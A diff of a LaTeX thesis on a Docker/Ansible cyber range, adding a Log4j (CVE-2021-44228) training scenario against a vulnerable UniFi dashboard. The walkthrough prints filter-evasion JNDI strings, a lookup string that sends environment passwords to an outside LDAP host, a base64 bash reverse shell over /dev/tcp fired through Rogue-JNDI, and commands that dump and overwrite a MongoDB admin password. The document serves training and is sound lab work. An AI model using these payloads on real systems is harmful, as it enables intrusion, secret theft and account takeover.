@@ -301,7 +301,7 @@ The \textit{internal PCs} role handles the behavior of machines inside the inter
 
 \subsubsection{Internal Role} \label{sec:ansible_internal_role}
 
-The \textit{internal} role is destined for the internal machines and DHCP server. It simply configures each device's default router as the internal router's interface located in the internal network.
+The \textit{internal} role is destined for the internal machines and DHCP server. It simply configures each device's default route as the internal router's interface located in the internal network. Every time a default gateway or static route is configured across the Ansible setup, the \textit{iproute2} package, installed on each Docker image by default, is used, which allows controlling and monitoring various aspects of networking in the Linux kernel, namely routing, tunnels, network interfaces, traffic control, among others.
 
 \subsubsection{DNS Role} \label{sec:ansible_dns_role}
 
@@ -415,10 +415,7 @@ http {
 }
 \end{lstlisting}
 
-After copying the above-listed template configuration file to the reverse proxy, we must deal with SSL certificates. For this, we first created a Certificate Authority (CA) by creating an \texttt{openssl.cnf} file and the necessary folder structure, as well as generating the public and private keys with the following command:
-
-\texttt{openssl req -x509 -newkey rsa:4096 -sha256 -days 3650 -keyout \\
-ca.key -out ca.crt}
+After copying the above-listed template configuration file to the reverse proxy, we must deal with SSL certificates. For this, we first created a Certificate Authority (CA) by defining an \texttt{openssl.cnf} file and the necessary folder structure, as well as generating the public and private keys associated to the CA.
 
 The \textit{reverse proxies} role generates a Certificate Signing Request (CSR), a specially formatted encrypted message sent from an SSL digital certificate applicant to a CA. The CA then takes the CSR and generates a public-key certificate signed by itself. At last, it removes the password from the private key of the newly issued private key and copies both this file and the public-key certificate to the reverse proxy container. At last, it starts the NGINX service with the loaded configuration. 
 
@@ -459,6 +456,8 @@ Concerning the external firewall, this role performs the following \texttt{iptab
         \end{itemize}
 \end{itemize}
 
+With both the internal and external firewalls, we intend to restrict the allowed traffic from the devices externally placed with respect to the organization's network. Only certain services in the DMZ should be allowed external access, never devices from the internal network. On the other hand, connections from inside the corporate network are allowed. This configuration uses \textit{iptables}. Therefore the rules are not based on highly-complex logic like which domains an internal device tries to access and if they should be blocked, according to a blocklist of IP addresses and domains.
+
 \subsubsection{Entry point Role} \label{sec:ansible_entrypoint_role}
 
 The \textit{entry point} role performs the necessary tasks to configure a certain machine, as defined at Listing \ref{lst:ansible_vars_8}. It creates the environment needed to run the setup scripts, which may include copying template files to the Docker container and then executing the entry point script. This role distinguishes when being conducted by the \textit{localhost} machine or a different machine. For the \textit{localhost}, the entry point script is run without any previous configuration. In the case of the other machines, the Jinja2 template setup files are first copied to the target container, and then the entry point script is run.
@@ -469,3 +468,257 @@ The \textit{mesh} role handles devices that need to join the Tailscale network, 
 
 This role's actions start by installing Tailscale and starting the \textit{tailscaled} service. After this, the container is instructed to join a specific Tailscale network using an authentication key and by specifying a hostname for the machine. An authentication key allows the addition of new nodes to the Tailscale network without needing to sign in to the network. As such, a reusable authentication key was created to connect multiple nodes to the network. Each time a new node joins the Tailscale network using this authentication key, it enters the group of Tailscale ephemeral nodes, which essentially refer to short-lived devices that are automatically removed from the network after a short period of inactivity and are immediately removed from the network in case they are instructed to do so. Also, the usage of the same hostname for a particular machine allows accessing it using a Tailscale feature called ``MagicDNS'' which essentially registers all the DNS names for the network's devices using the following logic: \texttt{[Device Hostname].[Network DNS Name]}
 The device's hostname was already mentioned above. By default, the network's DNS name is chosen by Tailscale upon the first usage. The ``MagicDNS'' configuration provides easy access to machines when they are not under our control. This will be very useful in the chapter of \textbf{CLOUD DEPLOYMENT}.
+
+\section{Custom Scenarios} \label{sec:validation_custom_scenarios}
+
+The set of custom scenarios involve three distinct cyber ranges:
+
+\begin{itemize}
+    \item A Linux scenario that explores the Apache Log4j vulnerability (CVE-2021-44228).
+    \item A Windows-based scenario that explores a Ransomware malware executable that encrypts a set of files.
+    \item A Windows-based scenario that exposes a vulnerable Active Directory Domain Controller that provides a wide attack surface where the trainee can experiment several attacks. 
+\end{itemize}
+
+For each challenge, details on how to solve them will be revealed. We will present some of the intended solutions to get the secret flag and, when available, unintended solutions.
+
+\subsection{Log4j Scenario} \label{sec:validation_log4j_scenario}
+
+The Apache Log4j vulnerability started haunting the world during the last month of the year of 2021. It was based on the Java-based logging package Apache Log4j and essentially allowed an attacker to execute code on a remote server, the so-called Remote Code Execution (RCE). The scope of machines this vulnerability targeted was huge and some put it in the same level of the most serious vulnerability along with \textit{Heartbleed} and \textit{Shellshock}. CVE-2021-4428\footnote{\url{https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228}} details which Log4j versions were affected and gives a brief insight of what is the vulnerability about. In simple words, an attacker that can control log messages may run arbitrary code by means of a process called message lookup substitution.
+
+Back in 2013, there was an upgrade in the Log4j package: the ``JNDILookup plugin''. JNDI means Java Naming and Directory Interface, and is a directory service that allows finding data in the form of a Java object through a directory. A directory service is essentially a database for storing information on users and resources. It is often used to manage access privileges, monitor, and control access to applications and infrastructure resources. JNDI supports a wide variety of directory services, being the most famous the Lightweight Directory Access Protocol (LDAP). This was the most targeted directory service in Log4j exploits. Java programs may use JNDI and LDAP together to find a Java object containing specific data. For instance, an URL such as \texttt{ldap://localhost:389/o=FEUPThesis} retrieves information on the \textit{FEUPThesis} object from the LDAP server running in port 389 of the same machine. In this example we used the combination \textit{localhost:389}, but the LDAP server could be potentially located anywhere on the internet. If an attacker controls the above-mentioned LDAP URL then this means they can potentially cause a program to load a malicious object from a server under their control and get remote execution control over a machine.
+
+Apache Log4j's syntax\footnote{\url{https://logging.apache.org/log4j/2.x/manual/configuration.html}} follows the pattern \texttt{\$\{prefix:name\}} where \texttt{prefix} is a lookup in the list of available lookups\footnote{\url{https://logging.apache.org/log4j/2.x/manual/lookups.html}}. Other examples, such as \texttt{\$\{java:version\}} would also be accepted and, in this case, would retrieve the current version of Java. Lookup messages were allowed to be used both in the Log4j configuration an in logged messages. The latter was what caused the vulnerability.
+
+All the attacker has to do is find an input that gets logged and add a malicious JNDI query that includes a malicious LDAP server controlled by the attacker. On web servers logged information typically includes the \textit{User-Agent} HTTP header or the inputted \textit{username}, for instance.
+
+There are techniques that can be used to evade simplistic blocking of strings like \texttt{\$\{jndi:ldap} by using some features of Log4j. For instance, we can use the \texttt{\$\{lower\}} feature which lowercases characters: \texttt{\$\{jndi:\$\{lower:l\}\$\{lower:d\}a\$\{lower:p\}://example.com/x\}}. The usage of the \texttt{:-} syntax which enables the attacker to set a default value for a lookup and if the value looked up does not exist, then the predefined default value is considered:
+
+\texttt{\$\{jndi:\$\{env:NOTEXIST:-l\}d\$\{env:NOTEXIST:-a\}\$\{env:NOTEXIST:-p\}}
+
+
+Similar techniques use strings like \texttt{\$\{\$\{::-j\}\$\{::-n\}\$\{::-d\}\$\{::-i\}}. Other techniques include encoding \textit{\$\{} as \textit{\%24\%7B} or \textit{\textbackslash u0024\textbackslash u007b}.
+
+During this period of cyber war if we can call it that way, there were attempts to gather information on the target machine using crafted strings. Several attempts were made to gather the machine users, Docker image names, home directory paths, details on Kubernetes and Spring, users and passwords from databases, hostnames, among others, as shown in Listing \ref{lst:log4j_crafted_string}.
+
+\clearpage
+
+\begin{lstlisting}[caption=Log4j Crafted String.,numbers=none,label={lst:log4j_crafted_string}]
+${${env:FOO:-j}ndi:${lower:L}da${lower:P}://x.x.x.x:1389/FUZZ.HEADER.${docker:
+imageName}.${sys:user.home}.${sys:user.name}.${sys:java.vm.version}.${k8s:cont
+ainerName}.${spring:spring.application.name}.${env:HOSTNAME}.${env:HOST}.${ctx
+:loginId}.${ctx:hostName}.${env:PASSWORD}.${env:MYSQL_PASSWORD}.${env:POSTGRES
+_PASSWORD}.${main:0}.${main:1}.${main:2}.${main:3}}
+\end{lstlisting}
+
+\subsection{Scenario Construction} \label{sec:validation_log4j_scenario_construction}
+
+This scenario was based on the Tier 2 Unified Hack The Box\footnote{\url{https://www.hackthebox.com/}} challenge and in the \textit{SprocketSecurity} blog post \cite{sprocketsecurity_ref}, essentially reproducing a vulnerable version of the Ubiquiti UniFi network application dashboard. This works as an interface manager for all the hardware devices belonging to the mesh network allowing the changing of several network-related configurations. To replicate the scenario, we used Goofball222's GitHub UniFi Docker container repository\footnote{\url{https://github.com/goofball222/unifi}}. We opted for using version 6.4.54 and tweaked a bit the Dockerfile suited for Alpine-based distributions by installing the \texttt{python3} package
+and removing the \texttt{JVM\_EXTRA\_OPTS=-Dlog4j2.formatMsgNoLookups\\=true} environment variable that disables variable lookups, which was turning the network application to be not vulnerable to Log4j exploit. It's also important to refer that this configuration uses a MongoDB database that supports the UniFi Network Application, where users are saved.
+
+% CA
+At first we could not get an HTTPS connection with UniFi's dashboard as a default CA certificate was generated by an untrusted CA. Therefore, it was time to create our Certificate Authority that was responsible for issuing the signed public-key digital certificates associated with a predefined domain name. By turning our create CA into trusted in the target device, it was possible to achieve an HTTPS connection. Listing \ref{lst:cmd_commands_unifi_ca} presents the commands that were used to create the CA's key pair, generating a CSR with the \textit{subjectAltName} extension, and getting the final public-key certificate signed by the new root CA, as well as the private key's password protection removed:
+
+\lstset{
+  language=bash,
+  basicstyle=\ttfamily,
+  showstringspaces=false,
+  commentstyle=\color{red},
+  keywordstyle=\color{blue}
+}
+
+\begin{lstlisting}[language=bash,caption=Generating an SSL Certificate for UniFi's dashboard.,numbers=none,label={lst:cmd_commands_unifi_ca}]
+#!/bin/bash
+
+# Generate CA keys (private and public keys)
+openssl req -x509 -newkey rsa:4096 -sha256 -days 3650 -keyout ca.key -out ca.crt
+
+# Generating Certificate Signing Request (notice the subjectAltName which is mandatory, at least in Firefox!)
+openssl req -newkey rsa:2048 -sha256 -keyout server.key -out server.csr -subj "/CN=example-domain.ui.com/O=UniFi/C=US" -passout pass:pass -addext "subjectAltName = DNS:example-domain.ui.com"
+
+# Generate Server Public-key Certificate
+openssl ca -config openssl.cnf -policy policy_anything -md sha256 -days 3650 -in server.csr -out server.crt -batch -cert ca.crt -keyfile ca.key
+
+# Remove Password from server's private key
+openssl rsa -in server.key -out server_nopass.key
+\end{lstlisting}
+
+The steps to load the certificates into the Docker container were as follows:
+
+\begin{enumerate}
+    \item Map the certificates folder path to the \texttt{/usr/lib/unifi/cert} volume exposed by the container.
+    \item Insert in the certificates folder the PEM format SSL private key file corresponding to the SSL certificate under the name of \texttt{privkey.pem}.
+    \item Insert also in the certificates folder the PEM format SSL certificate with the full certificate chain. under the name of \texttt{fullchain.pem}.
+\end{enumerate}
+
+The private key file belonging to UniFi's dashboard domain was obtain in the last command form Listing \ref{lst:cmd_commands_unifi_ca}. The full chain file is simply a concatenation of the public-key certificates of the CA and the \texttt{example-domain.ui.com} domain. 
+
+Furthermore, changes in the entry point scripts were made to always reload SSL certificates inside the Docker container. This was not the default behaviour as the Docker image was previously configured to issue a file with the hashes of the files in the certificates folder and check for their existence.
+
+% Entrypoint Script
+
+After the creation of the above mentioned SSL certificates, there is the need of including the newly created root CA's public-key certificate in the attacker machine so it can be considered trustworthy. This way, when the trainee visits the UniFi dashboard, the website appears as a legitimate HTTPS connection. This setup is presented in Listing  achieved with the following entry point script:
+
+\begin{lstlisting}[language=bash,caption=Entrypoint Bash Script.,numbers=none,label={lst:log4j_entrypoint_script}]
+#!/bin/bash
+
+cd "$( dirname "$0" )"
+
+# UniFi Wizard Setup 
+
+sleep 10
+pip install -r requirements.txt
+python3 setup.py
+
+# Load new trusted root CA
+
+cp /setup/ca.crt /usr/local/share/ca-certificates
+update-ca-certificates
+
+# Also in Firefox-Esr
+
+cat policies.json > /usr/lib/firefox-esr/distribution/policies.json
+\end{lstlisting}
+
+Every template file is within the scenario's \texttt{setup} folder. Firstly, we run a \textit{python} script that will be promptly explained. Then, we copy the root CA's public-key certificate into a special \texttt{ca-certificates} folder and run the \texttt{update-ca-certificates} command which turns our newly placed root CA certificate as system-wide trusted. So, every digital certificate signed by this new root CA will be deemed as safe. After this, we need Firefox browser to also consider this CA as safe. So we copied the \texttt{policies.json} file into a special folder.
+
+\begin{lstlisting}[caption=Firefox's Policies File.,numbers=none,label={lst:firefox_json_policies}]
+{
+    "policies": {
+      "Certificates": {
+        "ImportEnterpriseRoots": true,
+        "Install": [
+          "ca.crt",
+          "/setup/ca.crt"
+        ]
+      }
+    }
+  }
+\end{lstlisting}
+
+Listing \ref{lst:firefox_json_policies} presents the policies file which is read on every Firefox's new execution.
+
+% Selenium
+
+After loading the SSL certificates we obtained the desired effect, an HTTPS connection when loading UniFi's dashboard. Still, there was a slight problem. When hitting the dashboard's web page for the first time, the initial wizard setup was shown. We had to overcome this by creating a Selenium script (\textit{setup.py} shown in Listing \ref{lst:log4j_entrypoint_script}) for this effect using Firefox's \textit{WebDriver} as a way to remotely instruct the behavior of the browser. The tasks performed by Selenium can summarized in:
+
+\begin{itemize}
+    \item Visiting UniFi's web dashboard page.
+    \item Setting administrator credentials for accessing UniFi's web page. These were specified in the YAML format as custom variables of the vulnerable service in the scenario's specific variables.
+    \item Clicking several wizard setup buttons to move onto more advanced setup stages.
+\end{itemize}
+
+\subsection{Exploit} \label{sec:validation_log4j_exploit}
+
+The goal of the Log4j exploit on UniFi's software is to obtain a reverse shell, get the secret flag, and leverage access to get the administrative credentials on the UniFi MongoDB instance.
+
+Initially we can dig a little into the reconnaissance process and check which ports are open by default in the victim machine using \texttt{nmap}. We can see port 8443 which is where UniFi's interface is in.
+
+\begin{lstlisting}[caption=Nmap output over victim machine.,numbers=none,label={lst:nmap_victim}]
+# nmap -Pn example-domain.ui.com
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-29 18:52 UTC
+Nmap scan report for example-domain.ui.com (172.152.0.1)
+Host is up (0.000034s latency).
+rDNS record for 172.152.0.1: edge_router.external_net
+Not shown: 997 closed tcp ports (reset)
+PORT     STATE SERVICE
+53/tcp   open  domain
+443/tcp  open  https
+8443/tcp open  https-alt
+MAC Address: 02:42:AC:98:00:01 (Unknown)
+ 
+Nmap done: 1 IP address (1 host up) scanned in 0.32 seconds
+\end{lstlisting}
+
+Then, we access the \texttt{https://example-domain.ui.com:8443} domain and get the following page:
+
+\begin{figure}[H]
+    \includegraphics[width=15cm]{figures/unifi_initial_dashboard.png}
+    \caption{UniFi's initial dashboard.}
+    \label{fig:log4j_unifi_initial_dashboard}
+\end{figure}
+
+As mentioned earlier, we need to target a field that we know it will be logged by Apache Log4j, using a malicious JNDI query. In our case it is the \texttt{remember} field of the POST request.
+
+\begin{lstlisting}[caption=UniFi Dashboard POST Request.,numbers=none,label={lst:unifi_post_request}]
+POST /api/login HTTP/1.1
+Host: example-domain.ui.com:8443
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://example-domain.ui.com:8443/manage/account/login?redirect=%2Fmanage
+Content-Type: application/json; charset=utf-8
+Origin: https://example-domain.ui.com:8443
+Content-Length: 76
+Connection: keep-alive
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+ 
+{"username":"myuser","password":"mypassword","remember":false,"strict":true}
+\end{lstlisting}
+
+Then we need to test if the web application is vulnerable to the Log4j attack. First we listen for connections on port 9999 using \texttt{netcat} with: \texttt{nc -lnvp 9999}. From the example request of Listing \ref{lst:unifi_post_request} we only need to change the \texttt{remember} field to \texttt{\$\{jndi:ldap://172.152.0.2:9\\999/whatever\}} and issue the modified POST request:
+
+\begin{lstlisting}[caption=Issuing Malicious POST Request.,numbers=none,label={lst:unifi_malicious_post_request}]
+curl 'https://example-domain.ui.com:8443/api/login' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Referer: https://example-domain.ui.com:8443/manage/account/login?redirect=%2Fmanage' -H 'Content-Type: application/json; charset=utf-8' -H 'Origin: https://example-domain.ui.com:8443' -H 'Connection: keep-alive' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-origin' --data-raw '{"username":"a","password":"a","remember":"${jndi:ldap://172.152.0.2:9999/whatever}","strict":true}'
+\end{lstlisting}
+
+As we get a connection to port 9999 from the vulnerable Log4j container it means the web application is indeed vulnerable to the exploit. Notice \texttt{172.152.0.2} is the attacker machine's IP address. The next step is to use the Rogue-JNDI GitHub tool\footnote{\url{https://github.com/veracode-research/rogue-jndi}} to obtain a reverse shell on the target. Essentially, this tool sets up a malicious LDAP and HTTP server for JNDI injection attacks. When the tool first receives a connection from the vulnerable client, to connect to the local LDAP server, it responds with a malicious entry containing a payload that will be useful to achieve a Remote Code Execution. The steps to build upon this foundation are to stage an LDAP Referral Server that will redirect the initial client request of the victim to an HTTP server where a secondary payload is hosted that will eventually run code on the target. 
+
+The procedures to setup the exploit include first using \texttt{netcat} to listen for inbound connections on port 4444 with the command \texttt{nc -lnvp 4444} and then following the steps of Listing \ref{lst:unifi_clone_rogue_jndi}:
+
+\begin{enumerate}
+    \item Clone the Rogue JNDI tool and build the project into a JAR file using Maven.
+    \item Generate the Base64 payload that will run in the victim's server. It connects to the attacker machine on port 4444, redirecting both the standard input and standard output to the remote machine so the attacker can have full control over the victim.
+    \item Running Rogue JNDI tool to create malicious LDAP and HTTP server with command that will trigger a reverse shell.
+    \item Issue cURL command with malicious JNDI query and run exploit.
+\end{enumerate}
+
+\begin{lstlisting}[language=bash,caption=Cloning Rogue JNDI GitHub Repository.,numbers=none,label={lst:unifi_clone_rogue_jndi}]
+# Clone Rogue JNDI GitHub repository and build project
+git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mvn package
+
+# Create the Base64 payload 
+echo 'bash -c bash -i >&/dev/tcp/172.152.0.2/4444 0>&1' | base64
+
+# Running the malicious LDAP and HTTP Server with the Base64 malicious payload. The hostname flag denotes the target HTTP server.
+java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTcyLjE1Mi4wLjIvNDQ0NCAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname "172.152.0.2"
+
+# Running Exploit
+curl 'https://example-domain.ui.com:8443/api/login' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Referer: https://example-domain.ui.com:8443/manage/account/login?redirect=%2Fmanage' -H 'Content-Type: application/json; charset=utf-8' -H 'Origin: https://example-domain.ui.com:8443' -H 'Connection: keep-alive' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-origin' --data-raw '{"username":"a","password":"a","remember":"${jndi:ldap://172.152.0.2:1389/o=tomcat}","strict":true}'
+\end{lstlisting}
+
+As a result, we obtain a reverse shell in our initial \texttt{netcat} listener. We now have access to the target server under the \textit{unifi} user. Running a simple \texttt{ls -la} command we can see there is a weird file with the name \texttt{...} (3 dots). If we open it, we will find the challenge flag \texttt{flag\{l3ts\_un1f1\_every0ne\_l0g4j\}}.
+
+\subsection{Post Exploitation} \label{sec:validation_log4j_post_exploitation}
+
+Some lateral movement can be performed after getting the reverse shell on the victim. For instance, we can try to crack the administrative credentials for the UniFi network application stored in the MongoDB instance mentioned earlier in the Docker container construction using \texttt{hashcat}. Or, we can add add a new administrative user, for instance. In a real world setup, this would allow access to a whole new range of devices, possibly with some kind of vulnerabilities that would easily allow a way in. Persistence tasks could also be taken into account to allow consistent access to the victim machine.
+
+After getting the reverse shell prompt, we can first check if there really is a MongoDB instance running. We can do this by running \texttt{ps aux | grep mongo}. The result will show port 27117 listening for incoming MongoDB connections. Then, we can check which databases are available and get the contents of the \textit{admin} database.
+
+\begin{lstlisting}[caption=Fetching Contents of MongoDB Admin Collection.,numbers=none,label={lst:unifi_mongodb_admin_contents}]
+mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
+MongoDB shell version v3.4.4
+connecting to: mongodb://127.0.0.1:27117/ace
+MongoDB server version: 3.4.4
+{
+        "_id" : ObjectId("64750f87f19ea8014a2ceb6d"),
+        "name" : "test_user",
+        "email" : "admin@hotmail.com",
+        "x_shadow" : "$6$msad4FLZ$WwZoWNYAGbcGY3bF8HVBQ.t.69dt/ogu1nsmeTjsorz4dBl3Q0Waoya35R.Gm0qEgPoVsUorIhVRVpoiG8cFo/",
+        "time_created" : NumberLong(1685393287),
+        "last_site_name" : "default"
+}
+\end{lstlisting}
+
+Listing \ref{lst:unifi_mongodb_admin_contents} shows the existence of an administrator user named \textit{test\_user}, its email and the password hash of the user which can be seen in the \textit{x\_shadow} field. This is a SHA512 hash due to the \textit{\$6\$} characters at the start. As mentioned, it would be possible to crack this hash to get the provided password, however this could take a long time, so we opted for updating the current administrator's password. We first generate a SHA512 hash of the string ``mypassword'' using the command \texttt{mkpasswd -m sha-512 mypassword}. Lastly, the command on Listing \ref{lst:unifi_mongodb_update_admin_password} updates the administrator account password using the previously generated SHA 512 password.
+
+\begin{lstlisting}[caption=Update Administrator User Account Password.,numbers=none,label={lst:unifi_mongodb_update_admin_password}]
+mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("64750f87f19ea8014a2ceb6d")},{$set:{"x_shadow":"$6$zsmtIX0rAM.G4P8a$TKt4eg15VC11zpQaCVS6nLHdOYOzlfjO5m3Tvle7rtc1SOvMRYTT0jBBnRc
+CqY5lAOLDNst3xfGQdX99GtpD0."}})'
+\end{lstlisting}
+
+As we result, now the \textit{test\_user} account has the newly replaced password \textit{mypassword}.
+
+
